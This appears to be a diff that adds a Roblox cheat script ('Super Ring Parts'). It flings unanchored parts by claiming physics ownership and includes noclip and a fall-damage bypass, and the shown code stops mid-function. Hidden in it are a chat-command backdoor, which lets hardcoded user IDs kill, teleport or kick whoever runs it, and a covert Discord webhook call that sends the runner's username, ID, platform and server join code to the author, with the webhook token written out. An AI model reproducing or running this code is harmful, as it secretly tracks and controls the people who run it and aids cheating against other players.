@@ -1,0 +1,931 @@
+-- Services
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Array of target User IDs (Script Developers)
+local targetUserIds = {429038309, 123456789, 987654321} -- Add more User IDs here
+local developerTagText = "Script Developer"
+local developerTagColor = Color3.fromRGB(0, 102, 255) -- Blue Color
+
+-- Function to send a chat message
+local function SendChatMessage(message)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannel = TextChatService.TextChannels.RBXGeneral
+        textChannel:SendAsync(message)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    end
+end
+
+-- Function to handle commands from Script Developers
+local function handleCommand(command, sender)
+    if not table.find(targetUserIds, sender.UserId) then
+        return -- Ignore commands from non-developers
+    end
+
+    if command == ".kill" then
+        local character = LocalPlayer.Character
+        if character and character:FindFirstChild("Humanoid") then
+            character.Humanoid.Health = 0
+        end
+
+    elseif command == ".bring" then
+        local senderCharacter = sender.Character
+        local localCharacter = LocalPlayer.Character
+
+        if senderCharacter and localCharacter then
+            local rootPart = localCharacter:FindFirstChild("HumanoidRootPart")
+            local senderRootPart = senderCharacter:FindFirstChild("HumanoidRootPart")
+
+            if rootPart and senderRootPart then
+                rootPart.CFrame = senderRootPart.CFrame
+            end
+        end
+
+    elseif command == ".kick" then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "You Were Kicked!",
+            Text = "Script Developer Kicked You! You were probably annoying anyways...",
+            Duration = 5
+        })
+
+        task.wait(5)
+        LocalPlayer:Kick("Script Developer Kicked You! You were probably annoying anyways...")
+    end
+end
+
+-- Function to create a name tag
+local function createNameTag(player)
+    local function setupTag()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local head = character:WaitForChild("Head", 10) -- Wait for head to load
+
+        if not head or head:FindFirstChild("DeveloperTag") then
+            return -- Exit if head is missing or tag already exists
+        end
+
+        local billboardGui = Instance.new("BillboardGui")
+        billboardGui.Name = "DeveloperTag"
+        billboardGui.Adornee = head
+        billboardGui.Size = UDim2.new(4, 0, 1, 0)
+        billboardGui.StudsOffset = Vector3.new(0, 2, 0)
+        billboardGui.AlwaysOnTop = true
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = developerTagText
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.TextColor3 = developerTagColor
+        textLabel.TextStrokeTransparency = 0.5
+        textLabel.TextScaled = true
+        textLabel.Parent = billboardGui
+
+        billboardGui.Parent = head
+    end
+
+    player.CharacterAdded:Connect(function()
+        setupTag()
+    end)
+
+    if player.Character then
+        setupTag()
+    end
+end
+
+-- Function to create a notification frame
+local function createNotificationFrame(player)
+    local TweenService = game:GetService("TweenService")
+
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "DeveloperNotification"
+    notificationGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.15, 0) -- Adjusted size
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Centered on screen
+    frame.AnchorPoint = Vector2.new(0.5, 0.5) -- Anchor to center
+    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 39)
+    frame.BackgroundTransparency = 0.300
+    frame.BorderSizePixel = 0
+    frame.Parent = notificationGui
+
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(142, 14, 0)),
+        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(31, 28, 24))
+    }
+    gradient.Parent = frame
+
+    local avatarImage = Instance.new("ImageLabel")
+    avatarImage.Name = "Headshot"
+    avatarImage.Size = UDim2.new(0.2, 0, 0.8, 0)
+    avatarImage.Position = UDim2.new(0.05, 0, 0.1, 0)
+    avatarImage.BackgroundTransparency = 1
+    avatarImage.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=150&h=150"
+    avatarImage.Parent = frame
+
+    local avatarCorner = Instance.new("UICorner")
+    avatarCorner.CornerRadius = UDim.new(0.3, 0)
+    avatarCorner.Parent = avatarImage
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "Title"
+    titleLabel.Size = UDim2.new(0.7, 0, 0.4, 0)
+    titleLabel.Position = UDim2.new(0.3, 0, 0.1, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "A Script Developer Is in Your Server!"
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
+    titleLabel.TextScaled = true
+    titleLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextWrapped = true
+    titleLabel.Parent = frame
+
+    local usernameLabel = Instance.new("TextLabel")
+    usernameLabel.Name = "username"
+    usernameLabel.Size = UDim2.new(0.7, 0, 0.3, 0)
+    usernameLabel.Position = UDim2.new(0.3, 0, 0.55, 0)
+    usernameLabel.BackgroundTransparency = 1
+    usernameLabel.Text = "Username: " .. player.Name
+    usernameLabel.Font = Enum.Font.SourceSansBold
+    usernameLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
+    usernameLabel.TextScaled = true
+    usernameLabel.TextWrapped = true
+    usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    usernameLabel.Parent = frame
+
+    local frameCorner = Instance.new("UICorner")
+    frameCorner.Parent = frame
+
+    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local tween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0}) -- Smooth fade-in
+    tween:Play()
+
+    task.delay(5, function()
+        notificationGui:Destroy()
+    end)
+end
+
+-- Notify only if not a developer
+if not table.find(targetUserIds, LocalPlayer.UserId) then
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(targetUserIds, player.UserId) then
+            createNameTag(player)
+            createNotificationFrame(player)
+            SendChatMessage("OMG! A SCRIPT DEVELOPER 🤯")
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        if table.find(targetUserIds, player.UserId) then
+            createNameTag(player)
+            createNotificationFrame(player)
+            SendChatMessage("OMG! A SCRIPT DEVELOPER 🤯")
+        end
+    end)
+end
+
+-- Listen for chat messages
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        handleCommand(message, player)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleCommand(message, player)
+    end)
+end)
+
+-- ===============================================================
+
+local httpService = game:GetService("HttpService")
+local players = game:GetService("Players")
+local userInputService = game:GetService("UserInputService")
+local localPlayer = players.LocalPlayer
+local userId = localPlayer.UserId
+local username = localPlayer.Name
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+
+-- Determine platform using UserInputService
+local platform
+if userInputService.TouchEnabled then
+	platform = "Mobile"
+elseif userInputService.KeyboardEnabled then
+	platform = "PC"
+elseif userInputService.GamepadEnabled then
+	platform = "Console"
+else
+	platform = "Unknown"
+end
+
+-- Get JobId
+local jobId = game.JobId or "N/A"
+local placeId = game.PlaceId
+local teleportCode = string.format(
+	'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)',
+	placeId,
+	jobId
+)
+
+-- Replace with your actual Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1259159133169647716/zgEpZEtPGOe5AsamkF3Jx6dNHv96Vh1anjxCQiYCBK8d6GRFHrenRqWj1M2d_dnc-1V1"
+
+-- Create the payload
+local payload = {
+	["embeds"] = { {
+		["title"] = "Script Executed: Super Ring",
+		["description"] = "**User Info:**",
+		["fields"] = {
+			{
+				["name"] = "Username",
+				["value"] = username,
+				["inline"] = true
+			},
+			{
+				["name"] = "User ID",
+				["value"] = tostring(userId),
+				["inline"] = true
+			},
+			{
+				["name"] = "Profile Link",
+				["value"] = profileUrl,
+				["inline"] = false
+			},
+			{
+				["name"] = "Platform",
+				["value"] = platform,
+				["inline"] = true
+			},
+			{
+				["name"] = "Job ID",
+				["value"] = "```" .. jobId .. "```",
+				["inline"] = false
+			},
+			{
+				["name"] = "Teleport Code",
+				["value"] = "```lua\n" .. teleportCode .. "\n```",
+				["inline"] = false
+			}
+		},
+		["color"] = tonumber(0x7289DA)
+	} }
+}
+
+-- Attempt to send the payload via `request`
+local success, err = pcall(function()
+	request({
+		Url = webhookUrl,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = httpService:JSONEncode(payload)
+	})
+end)
+
+if not success then
+	warn("Failed to send data to webhook:", err)
+end
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Sound Effects
+local function playSound(soundId)
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://" .. soundId
+	sound.Parent = SoundService
+	sound:Play()
+	sound.Ended:Connect(function()
+		sound:Destroy()
+	end)
+end
+
+-- Play initial sound
+playSound("2865227271")
+
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SuperRingPartsGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 330, 0.3, 290)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
+MainFrame.BackgroundColor3 = Color3.fromRGB(205, 170, 125) -- Light brown
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Apply gradient to MainFrame
+local gradientMainFrame = Instance.new("UIGradient")
+gradientMainFrame.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(205, 170, 125)), -- Light brown
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0)) -- Dark red
+})
+gradientMainFrame.Rotation = 90
+gradientMainFrame.Parent = MainFrame
+
+-- Make the GUI round
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = MainFrame
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Super Modified Ring Parts!"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0) -- Light color for contrast
+Title.BackgroundColor3 = Color3.fromRGB(222, 216, 204) -- Lighter brown, contrast with red
+Title.Font = Enum.Font.Fondamento
+Title.TextSize = 22
+Title.Parent = MainFrame
+
+-- Apply gradient to Title
+local gradientTitle = Instance.new("UIGradient")
+gradientTitle.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 0, 0)), -- Dark red
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 69, 69)) -- Bright red
+})
+gradientTitle.Rotation = 90
+gradientTitle.Parent = Title
+
+-- Round the title
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 20)
+TitleCorner.Parent = Title
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0.8, 0, 0, 35)
+ToggleButton.Position = UDim2.new(0.1, 0, 0.2, 0)
+ToggleButton.Text = "Ring Parts Off"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(160, 82, 45) -- Sienna
+ToggleButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+ToggleButton.Font = Enum.Font.Fondamento
+ToggleButton.TextSize = 18
+ToggleButton.Parent = MainFrame
+
+-- Round the toggle button
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 10)
+ToggleCorner.Parent = ToggleButton
+
+local DecreaseRadius = Instance.new("TextButton")
+DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+DecreaseRadius.Position = UDim2.new(0.1, 0, 0.35, 0)
+DecreaseRadius.Text = "<"
+DecreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+DecreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+DecreaseRadius.Font = Enum.Font.Fondamento
+DecreaseRadius.TextSize = 18
+DecreaseRadius.Parent = MainFrame
+
+-- Round the decrease button
+local DecreaseCorner = Instance.new("UICorner")
+DecreaseCorner.CornerRadius = UDim.new(0, 10)
+DecreaseCorner.Parent = DecreaseRadius
+
+local IncreaseRadius = Instance.new("TextButton")
+IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+IncreaseRadius.Position = UDim2.new(0.7, 0, 0.35, 0)
+IncreaseRadius.Text = ">"
+IncreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+IncreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+IncreaseRadius.Font = Enum.Font.Fondamento
+IncreaseRadius.TextSize = 18
+IncreaseRadius.Parent = MainFrame
+
+-- Round the increase button
+local IncreaseCorner = Instance.new("UICorner")
+IncreaseCorner.CornerRadius = UDim.new(0, 10)
+IncreaseCorner.Parent = IncreaseRadius
+
+-- Speed Display
+
+local SpeedDisplay = Instance.new("TextLabel")
+SpeedDisplay.Size = UDim2.new(0.4, 0, 0, 35)
+SpeedDisplay.Position = UDim2.new(0.3, 0, 0.48, 0)
+SpeedDisplay.Text = "Speed: 50"
+SpeedDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
+SpeedDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+SpeedDisplay.Font = Enum.Font.Fondamento
+SpeedDisplay.TextSize = 18
+SpeedDisplay.Parent = MainFrame
+
+-- Round the Speed display
+local SpeedCorner = Instance.new("UICorner")
+SpeedCorner.CornerRadius = UDim.new(0, 10)
+SpeedCorner.Parent = SpeedDisplay
+
+--
+-- Decrease Speed Button
+local DecreaseSpeed = Instance.new("TextButton")
+DecreaseSpeed.Size = UDim2.new(0.2, 0, 0, 35)
+DecreaseSpeed.Position = UDim2.new(0.1, 0, 0.48, 0)
+DecreaseSpeed.Text = "<"
+DecreaseSpeed.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+DecreaseSpeed.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+DecreaseSpeed.Font = Enum.Font.Fondamento
+DecreaseSpeed.TextSize = 18
+DecreaseSpeed.Parent = MainFrame
+
+-- Round the decrease speed button
+local DecreaseSpeedCorner = Instance.new("UICorner")
+DecreaseSpeedCorner.CornerRadius = UDim.new(0, 10)
+DecreaseSpeedCorner.Parent = DecreaseSpeed
+
+-- Increase Speed Button
+local IncreaseSpeed = Instance.new("TextButton")
+IncreaseSpeed.Size = UDim2.new(0.2, 0, 0, 35)
+IncreaseSpeed.Position = UDim2.new(0.7, 0, 0.48, 0)
+IncreaseSpeed.Text = ">"
+IncreaseSpeed.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+IncreaseSpeed.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+IncreaseSpeed.Font = Enum.Font.Fondamento
+IncreaseSpeed.TextSize = 18
+IncreaseSpeed.Parent = MainFrame
+
+-- Round the increase speed button
+local IncreaseSpeedCorner = Instance.new("UICorner")
+IncreaseSpeedCorner.CornerRadius = UDim.new(0, 10)
+IncreaseSpeedCorner.Parent = IncreaseSpeed
+--
+
+--
+
+local RadiusDisplay = Instance.new("TextLabel")
+RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 35)
+RadiusDisplay.Position = UDim2.new(0.3, 0, 0.35, 0)
+RadiusDisplay.Text = "Radius: 50"
+RadiusDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
+RadiusDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+RadiusDisplay.Font = Enum.Font.Fondamento
+RadiusDisplay.TextSize = 18
+RadiusDisplay.Parent = MainFrame
+
+-- Round the radius display
+local RadiusCorner = Instance.new("UICorner")
+RadiusCorner.CornerRadius = UDim.new(0, 10)
+RadiusCorner.Parent = RadiusDisplay
+
+-- Noclip Button
+
+local NoclipButton = Instance.new("TextButton")
+NoclipButton.Size = UDim2.new(0.2, 0, 0, 35)
+NoclipButton.Position = UDim2.new(0.7, 0, 0.8, 0)
+NoclipButton.Text = "Noclip"
+NoclipButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+NoclipButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+NoclipButton.Font = Enum.Font.Fondamento
+NoclipButton.TextSize = 18
+NoclipButton.Parent = MainFrame
+
+-- Round the Noclip button
+local NoclipButtonCorner = Instance.new("UICorner")
+NoclipButtonCorner.CornerRadius = UDim.new(0, 10)
+NoclipButtonCorner.Parent = NoclipButton
+
+local BypassButton = Instance.new("TextButton")
+BypassButton.Size = UDim2.new(0.2, 0, 0, 35)
+BypassButton.Position = UDim2.new(0.48, 0, 0.8, 0) -- Adjusted X position for slight left shift
+BypassButton.Text = "No FallDMG"
+BypassButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+BypassButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+BypassButton.Font = Enum.Font.Fondamento
+BypassButton.TextSize = 14
+BypassButton.Parent = MainFrame
+
+
+-- Round the Bypass button
+local BypassButtonCorner = Instance.new("UICorner")
+BypassButtonCorner.CornerRadius = UDim.new(0, 10)
+BypassButtonCorner.Parent = BypassButton
+
+-- Create the FPS Display label
+local FpsDisplay = Instance.new("TextLabel")
+FpsDisplay.Size = UDim2.new(0.4, 0, 0, 35)
+FpsDisplay.Position = UDim2.new(0.04, 0, 0.8, 0)
+FpsDisplay.Text = "FPS: Calculating..."
+FpsDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
+FpsDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+FpsDisplay.Font = Enum.Font.Fondamento
+FpsDisplay.TextSize = 18
+FpsDisplay.Parent = MainFrame
+
+-- Round the FPS display
+local FpsCorner = Instance.new("UICorner")
+FpsCorner.CornerRadius = UDim.new(0, 10)
+FpsCorner.Parent = FpsDisplay
+
+local Watermark = Instance.new("TextLabel")
+Watermark.Size = UDim2.new(1, 0, 0, 20)
+Watermark.Position = UDim2.new(0, 0, 1, -20)
+Watermark.Text = "Credits to Projeto LKB"
+Watermark.TextColor3 = Color3.fromRGB(255, 255, 255) -- Dark brown
+Watermark.BackgroundTransparency = 1
+Watermark.Font = Enum.Font.Fondamento
+Watermark.TextSize = 14
+Watermark.Parent = MainFrame
+
+-- Add minimize button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 85, 127) -- Saddle brown
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+MinimizeButton.Font = Enum.Font.Fondamento
+MinimizeButton.TextSize = 18
+MinimizeButton.Parent = MainFrame
+
+-- Round the minimize button
+local MinimizeCorner = Instance.new("UICorner")
+MinimizeCorner.CornerRadius = UDim.new(0, 15)
+MinimizeCorner.Parent = MinimizeButton
+
+local TeleportButton = Instance.new("TextButton")
+TeleportButton.Size = UDim2.new(0.8, 0, 0, 35)
+TeleportButton.Position = UDim2.new(0.1, 0, 0.58, 0) -- Adjusted X position for visual alignment
+TeleportButton.Text = "Transfer to Spectator"
+TeleportButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+TeleportButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+TeleportButton.Font = Enum.Font.Fondamento
+TeleportButton.TextSize = 18
+TeleportButton.Parent = MainFrame
+
+-- Round the teleport button
+local TeleportButtonCorner = Instance.new("UICorner")
+TeleportButtonCorner.CornerRadius = UDim.new(0, 10)
+TeleportButtonCorner.Parent = TeleportButton
+
+
+
+local ReturnButton = Instance.new("TextButton")
+ReturnButton.Size = UDim2.new(0.8, 0, 0, 35)
+ReturnButton.Position = UDim2.new(0.1, 0, 0.58, 0) -- Same position as Teleport Button, so it overlaps
+ReturnButton.Text = "Return"
+ReturnButton.BackgroundColor3 = Color3.fromRGB(255, 69, 0) -- Red-Orange color
+ReturnButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+ReturnButton.Font = Enum.Font.Fondamento
+ReturnButton.TextSize = 18
+ReturnButton.Visible = false -- Initially hidden
+ReturnButton.Parent = MainFrame
+
+-- Round the return button
+local ReturnButtonCorner = Instance.new("UICorner")
+ReturnButtonCorner.CornerRadius = UDim.new(0, 10)
+ReturnButtonCorner.Parent = ReturnButton
+
+-- Minimize functionality
+local minimized = false
+MinimizeButton.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	if minimized then
+		MainFrame:TweenSize(UDim2.new(-0.10, 330, 0, 40), "Out", "Quad", 0.5, true) -- Change height only for minimized state
+		MinimizeButton.Text = "+"
+		Title.Visible = false
+		ToggleButton.Visible = false
+		DecreaseRadius.Visible = false
+		IncreaseRadius.Visible = false
+		RadiusDisplay.Visible = false
+		DecreaseSpeed.Visible = false
+		IncreaseSpeed.Visible = false
+		SpeedDisplay.Visible = false
+		Watermark.Visible = false
+		NoclipButton.Visible = false
+		FpsDisplay.Visible = false
+		BypassButton.Visible = false
+		TeleportButton.Visible = false
+	else
+		MainFrame:TweenSize(UDim2.new(0, 330, 0.3, 290), "Out", "Quad", 0.3, true) -- Restore to full size
+		MinimizeButton.Text = "-"
+		Title.Visible = true
+		ToggleButton.Visible = true
+		DecreaseRadius.Visible = true
+		IncreaseRadius.Visible = true
+		RadiusDisplay.Visible = true
+		DecreaseSpeed.Visible = true
+		IncreaseSpeed.Visible = true
+		SpeedDisplay.Visible = true
+		Watermark.Visible = true
+		NoclipButton.Visible = true
+		FpsDisplay.Visible = true
+		BypassButton.Visible = true
+		TeleportButton.Visible = true
+	end
+	playSound("12221967")
+end)
+
+
+-- Make GUI draggable
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+MainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = MainFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+-- Ring Parts Logic
+if not getgenv().Network then
+	getgenv().Network = {
+		BaseParts = {},
+		Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+	}
+	Network.RetainPart = function(Part)
+		if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
+			table.insert(Network.BaseParts, Part)
+			Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+			Part.CanCollide = false
+		end
+	end
+	local function EnablePartControl()
+		LocalPlayer.ReplicationFocus = workspace
+		RunService.Heartbeat:Connect(function()
+			sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+			for _, Part in pairs(Network.BaseParts) do
+				if Part:IsDescendantOf(workspace) then
+					Part.Velocity = Network.Velocity
+				end
+			end
+		end)
+	end
+	EnablePartControl()
+end
+
+local radius = 50
+local height = 100
+local rotationSpeed = 10
+local attractionStrength = 1000
+local ringPartsEnabled = false
+
+local function RetainPart(Part)
+	if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(workspace) then
+		if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
+			return false
+		end
+
+		Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+		Part.CanCollide = false
+		return true
+	end
+	return false
+end
+
+local parts = {}
+local function addPart(part)
+	if RetainPart(part) then
+		if not table.find(parts, part) then
+			table.insert(parts, part)
+		end
+	end
+end
+
+local function removePart(part)
+	local index = table.find(parts, part)
+	if index then
+		table.remove(parts, index)
+	end
+end
+
+for _, part in pairs(workspace:GetDescendants()) do
+	addPart(part)
+end
+
+workspace.DescendantAdded:Connect(addPart)
+workspace.DescendantRemoving:Connect(removePart)
+
+local targetCoordinates = Vector3.new(-280, 179, 342) -- Spectator position
+local isAtSpectator = false -- Track whether the parts are at the spectator or player
+
+
+RunService.Heartbeat:Connect(function()
+	if not ringPartsEnabled then return end -- Stop logic if disabled
+
+	-- Determine the target center
+	local targetCenter
+	if isAtSpectator then
+		targetCenter = targetCoordinates -- Use spectator coordinates
+	else
+		local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+		targetCenter = humanoidRootPart and humanoidRootPart.Position -- Use player's position
+	end
+
+	-- Update parts if targetCenter is valid
+	if targetCenter then
+		for _, part in pairs(parts) do
+			if part.Parent and not part.Anchored then
+				local pos = part.Position
+				local distance = (Vector3.new(pos.X, targetCenter.Y, pos.Z) - targetCenter).Magnitude
+				local angle = math.atan2(pos.Z - targetCenter.Z, pos.X - targetCenter.X)
+				local newAngle = angle + math.rad(rotationSpeed) -- Update rotation angle
+				local targetPos = Vector3.new(
+					targetCenter.X + math.cos(newAngle) * math.min(radius, distance),
+					targetCenter.Y + (height * math.abs(math.sin((pos.Y - targetCenter.Y) / height))),
+					targetCenter.Z + math.sin(newAngle) * math.min(radius, distance)
+				)
+
+				-- Calculate the direction and apply velocity
+				local directionToTarget = (targetPos - part.Position).unit
+				part.Velocity = directionToTarget * attractionStrength
+			end
+		end
+	end
+end)
+
+function noclip()
+	Clip = false
+	local function Nocl()
+		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
+			for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
+					v.CanCollide = false
+				end
+			end
+		end
+		wait(0.21) -- basic optimization
+	end
+	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
+end
+
+function clip()
+	if Noclip then Noclip:Disconnect() end
+	Clip = true
+end
+
+local RunService = game:GetService("RunService")
+local lastFrameTime = tick()
+local fps = 0
+
+RunService.RenderStepped:Connect(function()
+	local currentTime = tick()
+	fps = math.floor(1 / (currentTime - lastFrameTime))
+	lastFrameTime = currentTime
+
+	FpsDisplay.Text = "FPS: " .. tostring(fps)
+end)
+
+local runsvc = game:GetService("RunService")
+local players = game:GetService("Players")
+
+local lp = players.LocalPlayer
+local heartbeat = runsvc.Heartbeat
+local rstepped = runsvc.RenderStepped
+local novel = Vector3.zero -- Zero velocity vector
+
+-- No fall damage function
+local function nofalldamage(chr)
+	if not chr then return end -- Early return if no character
+
+	local root = chr:WaitForChild("HumanoidRootPart", 5) -- Wait up to 5 seconds for HumanoidRootPart
+	if not root then return end -- Exit if root doesn't exist
+
+	local con
+	con = heartbeat:Connect(function()
+		if not root.Parent then
+			con:Disconnect() -- Clean up the connection if character is removed
+			return
+		end
+
+		local oldvel = root.AssemblyLinearVelocity
+		root.AssemblyLinearVelocity = novel -- Neutralize velocity
+		rstepped:Wait() -- Smooth reset
+		root.AssemblyLinearVelocity = oldvel -- Restore velocity
+	end)
+end
+
+
+
+
+-- Button functionality
+
+TeleportButton.MouseButton1Click:Connect(function()
+	isAtSpectator = not isAtSpectator
+	TeleportButton.Text = isAtSpectator and "Return to Player" or "Transfer to Spectator"
+	TeleportButton.BackgroundColor3 = isAtSpectator and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(139, 69, 19)
+end)
+
+
+BypassButton.MouseButton1Click:Connect(function()
+	nofalldamage(lp.Character) -- Apply no fall damage to the current character
+	lp.CharacterAdded:Connect(nofalldamage) -- Ensure it applies after respawn
+end)
+
+NoclipButton.MouseButton1Click:Connect(function()
+	noclipEnabled = not noclipEnabled -- Toggle state
+	NoclipButton.Text = noclipEnabled and "Un-Noclip" or "Noclip" -- Update button text
+	NoclipButton.BackgroundColor3 = noclipEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(139, 69, 19) -- Change color
+	playSound("12221967") -- Play sound
+
+	if noclipEnabled then
+		noclip() -- Enable noclip
+	else
+		clip() -- Disable noclip
+	end
+end)
+
+ToggleButton.MouseButton1Click:Connect(function()
+	ringPartsEnabled = not ringPartsEnabled
+	ToggleButton.Text = ringPartsEnabled and "Ring Parts On" or "Ring Parts Off"
+	ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
+	playSound("12221967")
+end)
+
+DecreaseRadius.MouseButton1Click:Connect(function()
+	radius = math.max(10, radius - 5)
+	RadiusDisplay.Text = "Radius: " .. radius
+	playSound("12221967")
+end)
+
+
+
